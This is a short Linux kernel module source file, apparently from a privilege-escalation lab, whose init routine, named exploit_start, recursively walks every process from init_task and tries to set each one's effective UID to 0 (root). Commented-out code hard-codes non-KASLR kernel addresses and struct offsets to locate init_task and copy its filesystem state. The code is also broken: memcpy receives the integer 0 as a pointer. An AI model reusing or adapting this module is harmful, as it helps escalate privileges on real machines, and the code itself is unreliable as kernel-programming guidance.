#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/sched/task.h>
#include <linux/fs_struct.h>
#include <linux/cred.h>
#include <linux/uidgid.h>

void DFS(struct task_struct* task){
  struct task_struct* next_task;
  struct list_head* list;
  void* euid;
  int zero;

  list_for_each(list, &task->children){
    next_task = list_entry(list, struct task_struct, sibling);
    euid = &next_task->cred->euid;
    zero = 0;
    memcpy(euid,zero,sizeof(int));
    printk(KERN_INFO "pid: %d | pname: %s | uid: %d\n", next_task->pid, next_task->comm, next_task->cred->uid);
    DFS(next_task);
  }
}


static int __init exploit_start(void)
{
  // struct task_struct *task;
  // struct task_struct *_init_task;
  // long nokaslr_init_task = 0xffffffff81e12600;
  // long nokaslr_printk = 0xffffffff8165aa26;
  // _init_task = (void*)_printk - nokaslr_printk + nokaslr_init_task;

  // // Output addresses for debugging
  // printk(KERN_INFO "init_task address: %px\n", _init_task);
  // printk(KERN_INFO "inii_task from lib: %px\n", &init_task);
  // printk(KERN_INFO "printk address: %px\n", (void*)_printk);

  // _init_task = &init_task;
  // task = _init_task;
  // while (1) {
  //   // task->fs = init_task->fs;
  //   // *(void**)((void*)task + 2488) = *(void**)((void*)_init_task + 0x5a8);
  //   // next task
  //   task = (*(void**)((void*)task + 0x2d0)) - 0x2d0;
  //   if (task == _init_task) {
  //     break;
  //   }
  // }
  DFS(&init_task);
	return 0;
}

static void __exit exploit_end(void)
{
}

module_init(exploit_start);
module_exit(exploit_end);
MODULE_LICENSE("GPL");